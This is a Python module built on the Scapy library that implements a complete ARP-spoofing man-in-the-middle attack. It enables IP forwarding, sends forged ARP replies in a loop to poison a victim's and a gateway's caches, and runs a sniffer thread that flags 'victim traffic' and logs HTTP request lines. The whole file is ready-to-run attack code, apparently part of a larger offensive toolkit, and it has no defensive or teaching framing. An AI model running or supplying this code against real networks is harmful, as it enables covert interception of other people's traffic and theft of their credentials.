
import threading
import time
import os
import sys

# Standard imports for Scapy - removed lazy loading complexity
try:
    from scapy.all import ARP, Ether, srp, sendp, sniff, TCP, Raw, IP
    from scapy.arch import get_if_hwaddr
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False
    print("[!] Scapy not installed. ARP Spoofing will not work.")

class ArpSpooferModule:
    def __init__(self):
        self.attack_running = False
        self.current_interface = 'eth0'
        self.sniff_thread = None
        self.victim_traffic_seen = False

    def set_ip_forward(self, enable=True):
        """Enable or disable IP forwarding."""
        try:
            if os.geteuid() != 0:
                return "[!] Warning: Not running as root."
            
            with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
                f.write("1" if enable else "0")
            return f"[+] IP forwarding {'enabled' if enable else 'disabled'}"
        except Exception as e:
            return f"[!] IP forwarding error: {e}"

    def get_mac(self, ip, log_callback=None):
        if not SCAPY_AVAILABLE: return None
        
        if log_callback: log_callback(f"[?] Resolving MAC for {ip}...", type='info')
        try:
            # Send ARP Request to Broadcast
            ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, verbose=False)
            if ans:
                mac = ans[0][1].hwsrc
                if log_callback: log_callback(f"[+] Resolved {ip} -> {mac}", type='success')
                return mac
            
            if log_callback: log_callback(f"[!] Could not resolve MAC for {ip}", type='warning')
            return None
        except Exception as e:
            if log_callback: log_callback(f"[!] Error resolving MAC: {e}", type='error')
            return None

    def send_spoof_packet(self, target_ip, target_mac, spoof_ip, interface):
        try:
            # Construct malicious ARP packet
            packet = Ether(dst=target_mac, src=get_if_hwaddr(interface)) / \
                     ARP(op=2, psrc=spoof_ip, pdst=target_ip, hwdst=target_mac)
            sendp(packet, iface=interface, verbose=False)
            return True, None
        except Exception as e:
            return False, str(e)

    def restore(self, target_ip, gateway_ip, interface):
        """Restore network to normal state."""
        try:
            target_mac = self.get_mac(target_ip)
            gateway_mac = self.get_mac(gateway_ip)
            if target_mac and gateway_mac:
                # Send legitimate ARP reply with correct MACs
                packet = Ether(dst=target_mac, src=gateway_mac) / \
                         ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst=target_mac, hwsrc=gateway_mac)
                sendp(packet, iface=interface, count=3, verbose=False)
        except Exception:
            pass

    def packet_callback(self, packet, log_callback, target_ip):
        # Simplified logging callback
        if not log_callback: return

        if packet.haslayer(IP) and packet[IP].src == target_ip:
            if not self.victim_traffic_seen:
                self.victim_traffic_seen = True
                log_callback(f"[+] 🚨 VICTIM TRAFFIC DETECTED from {target_ip}!", type='success')

        # Check for interesting HTTP traffic (Basic)
        if packet.haslayer(Raw) and packet.haslayer(TCP):
             try:
                payload = packet[Raw].load.decode('utf-8', errors='ignore')
                if "POST" in payload or "GET" in payload:
                    # Just log the first line (Request Line)
                    first_line = payload.split('\r\n')[0]
                    log_callback(f"[HTTP] {packet[IP].src} -> {first_line}")
             except:
                pass

    def sniff_loop(self, interface, log_callback, target_ip):
        try:
            log_callback(f"[*] Sniffer started on {interface}...", type='info')
            sniff(
                iface=interface,
                prn=lambda p: self.packet_callback(p, log_callback, target_ip),
                filter=f"ip host {target_ip}", 
                store=False,
                stop_filter=lambda x: not self.attack_running
            )
        except Exception as e:
            log_callback(f"[!] Sniffer error: {e}", type='error')

    def spoof(self, target_ip, gateway_ip, interface, stats_callback=None, log_callback=None):
        if not SCAPY_AVAILABLE: return
        if self.attack_running: return

        self.attack_running = True
        self.current_interface = interface
        
        # 1. Setup
        msg = self.set_ip_forward(True)
        if log_callback: log_callback(msg)

        target_mac = self.get_mac(target_ip, log_callback)
        gateway_mac = self.get_mac(gateway_ip, log_callback)

        if not target_mac or not gateway_mac:
            if log_callback: log_callback("[!] Failed to resolve MACs. Stopping.", type='error')
            self.attack_running = False
            return
        
        # 2. Start Sniffer
        self.victim_traffic_seen = False
        self.sniff_thread = threading.Thread(target=self.sniff_loop, args=(interface, log_callback, target_ip), daemon=True)
        self.sniff_thread.start()

        # 3. Main Loop
        packets_sent = 0
        start_time = time.time()
        if log_callback: log_callback(f"[*] Starting spoof loop. {target_ip} <--> {gateway_ip}", type='success')

        try:
            while self.attack_running:
                self.send_spoof_packet(target_ip, target_mac, gateway_ip, interface)
                self.send_spoof_packet(gateway_ip, gateway_mac, target_ip, interface)
                
                packets_sent += 2
                if stats_callback:
                    stats_callback(packets_sent, time.time() - start_time)
                    
                time.sleep(2)
        except Exception as e:
            if log_callback: log_callback(f"[!] Attack loop error: {e}", type='error')
        finally:
            if log_callback: log_callback("[*] Restoring network...")
            self.restore(target_ip, gateway_ip, interface)
            self.restore(gateway_ip, target_ip, interface)
            self.set_ip_forward(False)
            if log_callback: log_callback("[+] Network restored.")

    def stop(self):
        self.attack_running = False

# Global Instance
arp_spoofer_module = ArpSpooferModule()